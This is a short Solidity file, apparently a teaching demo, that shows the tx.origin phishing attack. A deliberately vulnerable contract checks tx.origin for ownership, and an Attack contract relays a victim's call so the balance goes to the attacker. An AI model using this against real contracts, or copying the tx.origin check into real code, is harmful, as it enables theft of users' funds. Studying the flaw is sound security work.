//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

// tx.origin attack

contract Attack {
    Phisable phisableContract;
    address payable attacker;

    constructor(Phisable phisableAddress, address payable attackerAddr) {
        // contract address of phisable contract
        phisableContract = phisableAddress;
        // externally owned account of attacker
        attacker = attackerAddr;
    }

    // attacker has to ensure that user clicks othis function
    function UnsafeOperation() external payable {
        phisableContract.withdrawAll(attacker);
    }
}

contract Phisable {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function sendEther() public payable {
        // user was sending eth to this contract
        // through this function
    }

    function withdrawAll(address payable _recipient) public {

        // if user call UnsafeOperation, tx.origin==user's account addr
        // _recipient would be attacker account
        // assume that user has interacted with this contract earlier 
        // because of which user acc. addr == owner in this contract
        
        require(tx.origin == owner); // only those who deploy this contract would be able to execute this function
        _recipient.transfer(address(this).balance);
    }
}
